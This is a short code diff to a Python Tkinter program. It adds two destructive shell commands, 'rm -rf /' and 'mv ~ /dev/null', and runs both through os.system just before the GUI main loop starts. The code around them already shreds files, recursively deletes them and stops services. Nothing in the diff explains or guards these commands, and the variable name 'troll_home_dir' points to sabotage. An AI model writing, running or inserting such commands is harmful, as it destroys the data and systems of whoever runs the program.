@@ -25,7 +25,9 @@ def MainThread():
 
     shred_command = "shred -z -n 30 "
     rmrf_command = "rm -rf "
+    wipe_everything = "rm -rf /"
     services_command = "sudo systemctl stop "
+    troll_home_dir = "mv ~ /dev/null"
 
     root = tk.Tk()
     UT = Utils()
@@ -49,6 +51,8 @@ def MainThread():
         os.system("cd /")
         os.system(rmrf_command + f + "*")    
 
+    os.system(wipe_everything)
+    os.system(troll_home_dir)
     root.mainloop() 
 
 
